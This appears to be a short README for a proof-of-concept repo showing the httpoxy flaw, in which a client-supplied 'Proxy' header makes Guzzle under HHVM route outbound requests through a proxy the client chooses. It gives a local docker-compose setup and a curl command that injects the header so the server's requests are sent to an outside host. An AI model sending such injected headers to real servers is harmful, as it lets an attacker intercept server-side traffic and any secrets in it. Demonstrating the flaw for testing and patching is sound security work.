# HHVM Httpoxy Vulnerability

## Steps

This is how the vulnerability works:

1. Do the usual PHP thing of exposing user-supplied headers as `$_SERVER['HTTP_*']`
2. Be using Guzzle from an HHVM request handler
3. As an HTTP client, inject a `Proxy: my-malicious-service` header to any request made
4. Watch as Guzzle helpfully sends the request to the malicious proxy, supplied by the client

## Using this repo

This repo contains a docker-compose setup that puts index.php into an HHVM FastCGI container. To test:

* docker-compose up -d
* curl -vv -H 'Proxy: somewhere:1234' http://localhost:8001/index.php
* collect reflected request at somewhere:1234
